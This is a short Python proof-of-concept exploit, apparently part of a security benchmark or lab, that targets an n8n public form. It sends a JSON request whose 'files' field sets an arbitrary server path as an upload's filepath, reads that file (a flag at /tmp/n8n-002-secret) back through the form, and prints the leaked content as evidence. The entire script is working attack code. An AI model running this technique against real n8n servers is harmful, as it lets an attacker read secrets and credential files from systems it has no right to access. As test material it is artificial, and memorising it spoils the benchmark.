#!/usr/bin/env python3
"""Read an injected file through a JSON request to an n8n form."""

import json
import os
import time
import urllib.error
import urllib.request


FLAG_PATH = "/tmp/n8n-002-secret"
FORM_PATH = "/form/vulnerable-form"


def wait_for_form(url: str) -> None:
    for attempt in range(45):
        try:
            with urllib.request.urlopen(url, timeout=5) as response:
                if response.status == 200:
                    return
        except (urllib.error.URLError, TimeoutError):
            pass
        if attempt < 44:
            time.sleep(2)
    raise RuntimeError("Public form was not ready")


def read_file(url: str) -> tuple[int, str]:
    body = {
        "data": {},
        "files": {
            "document": {
                "filepath": FLAG_PATH,
                "originalFilename": "document.bin",
                "mimetype": "application/octet-stream",
                "size": 64,
            }
        },
    }
    request = urllib.request.Request(
        url,
        data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        response = urllib.request.urlopen(request, timeout=30)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.read().decode("utf-8")


def main() -> None:
    base_url = (
        os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    ).rstrip("/")
    url = base_url + FORM_PATH
    wait_for_form(url)
    status, content = read_file(url)
    if status != 200:
        raise RuntimeError(f"Form file request returned HTTP {status}")
    print(
        json.dumps(
            {
                "evidence_payload": {"flag_path": FLAG_PATH, "content": content},
                "request_status": status,
            }
        )
    )


if __name__ == "__main__":
    main()
